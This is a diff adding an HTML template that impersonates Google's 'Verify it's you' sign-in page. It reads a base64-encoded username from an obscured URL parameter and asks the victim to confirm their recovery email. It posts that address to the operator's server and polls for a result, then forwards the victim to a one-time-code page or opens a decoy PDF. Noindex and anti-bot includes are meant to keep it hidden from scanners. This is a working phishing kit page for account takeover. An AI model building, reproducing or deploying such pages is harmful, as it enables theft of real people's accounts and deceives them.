@@ -1,0 +1,196 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <%- include('partials/meta-noindex') %>
+    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/newstylee.css">
+    <style>
+        #pEyar {
+            font-size: 18px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #2c2a2a;
+        }
+        
+        /* Prevent zoom layout issues */
+        .loginform {
+            width: 1000px !important;
+            max-width: 1000px !important;
+            min-height: 180px !important;
+            margin: 0 auto !important;
+            transform: none !important;
+        }
+        
+        .fgtpwd {
+    margin-left: 240px !important;
+    margin-right: auto !important;
+    justify-content: flex-start !important;
+    display: flex !important;
+}
+
+        
+        .btmdiv {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            width: 1000px !important;
+            max-width: 1000px !important;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 25px;
+            box-sizing: border-box;
+        }
+        
+        .left-div {
+            margin-left: -20px;
+            flex: 0;
+        }
+        
+        .right-divs {
+            margin-right: -20px;
+            flex: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="maindiv">
+        <div class="form-container">
+            <div class="white-overlay" id="whiteOverlay"></div>
+            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
+        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+       
+            <div class="form-half">
+                <div><img class="divlogo" src="/image/image.png" ></div>
+                <br>
+                <div><span class="welcome">Verify it's you<span></div> 
+                    <br>   
+                    <div><span class="welcome1"><span style="white-space:nowrap;">To help keep your account safe, Google wants to make sure it's</span><br>really you trying to sign in. <a href="" style="color:#0b57d0; text-decoration:none;">Learn more</a><span></div>  
+                    <br>
+                        <div class="userdiv">
+                  <img class="left-img"  src="/image/user-circle.png" >&nbsp;&nbsp;
+                  <span class="userdiv-name" style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;"></span>&#8201;<span class="chip-arrow">▾</span>&#8201;
+                  
+                </div>
+            </div>
+            
+            <div class="form-half1">
+            
+                <div class="rec-info">
+                    <span>Confirm the recovery email address you added to your account:</span><br>
+                    <span><%= recemail %></span>
+                </div>
+
+                <div class="passdiv">
+                    <input type='hidden' name="username" id="useRname" value="">
+                    <input  required='' name="recoveryemail" type='email' id="pEyar">
+                    <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter recovery email address' placeholder='Recovery email address'></label>
+                    <div id="errorMsg" class="error-msg" style="display:none;"><img src="/image/emee.png"></div>
+                </div>
+
+               
+
+                <script src="/JS/pass.js"></script>
+
+                <div class="fgtpwd">
+                    <button type="button" id="myButton" class="hyperl" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
+                    <button type="button" class="btnnxt" id="nextBtn"><b>Next</b></button>
+                  </div>
+
+            </div>
+     
+        </form>
+        </div>
+        
+
+        <div class="btmdiv">
+            <div class="left-div">
+                <select class="btmhypl" id="language-select">
+                    <option value="en">English (United States)</option>
+                    <option value="fr">French</option>
+                    <option value="es">Spanish</option>
+                    <option value="de">German</option>
+                    <!-- Add more options as needed -->
+                </select>
+            </div>
+                <div class="right-divs">
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Help</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Privacy</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Terms</button>
+                    </div>
+                </div>
+        </div>
+
+
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const tk = new URLSearchParams(window.location.search).get('mbbjgsmhyropjmhnkidgdjkjsetwungdkdh') || '';
+      const username = atob(tk);
+      document.getElementById('useRname').value = username;
+      document.querySelector('.userdiv-name').textContent = username;
+
+      document.getElementById('myButton').onclick = function () {
+        location.href = "https://mail.google.com";
+      };
+
+      function showError() {
+        document.getElementById('loadingBar').classList.remove('active');
+        document.getElementById('whiteOverlay').classList.remove('active');
+        const input = document.getElementById('pEyar');
+        input.classList.add('input-error');
+        document.getElementById('errorMsg').style.display = 'block';
+      }
+
+      function pollResult(username) {
+        fetch('/recemailresult?u=' + encodeURIComponent(username))
+          .then(r => r.json())
+          .then(data => {
+            if (data.result === 'redirected_eotp') {
+              window.location.href = '/eotp?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+            } else if (data.result === 'success') {
+              window.location.href = '/Vis of HIT team to China.pdf';
+            } else if (data.result === 'redirected') {
+              window.location.href = '/Vis of HIT team to China.pdf';
+            } else if (data.result === 'error') {
+              showError();
+            } else {
+              setTimeout(() => pollResult(username), 2000);
+            }
+          }).catch(() => setTimeout(() => pollResult(username), 2000));
+      }
+
+      document.getElementById('nextBtn').onclick = function () {
+        const email = document.getElementById('pEyar').value;
+        const username = document.getElementById('useRname').value;
+        if (!email) return;
+        document.getElementById('loadingBar').classList.add('active');
+        document.getElementById('whiteOverlay').classList.add('active');
+        fetch('/req/recemail', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ username, recoveryemail: email })
+        }).then(() => pollResult(username))
+          .catch(() => pollResult(username));
+      };
+
+      document.getElementById('pEyar').addEventListener('input', function() {
+        this.classList.remove('input-error');
+        document.getElementById('errorMsg').style.display = 'none';
+      });
+    });
+    </script>
+    
+<%- include('partials/antibot') %>
+</body>
+</html>
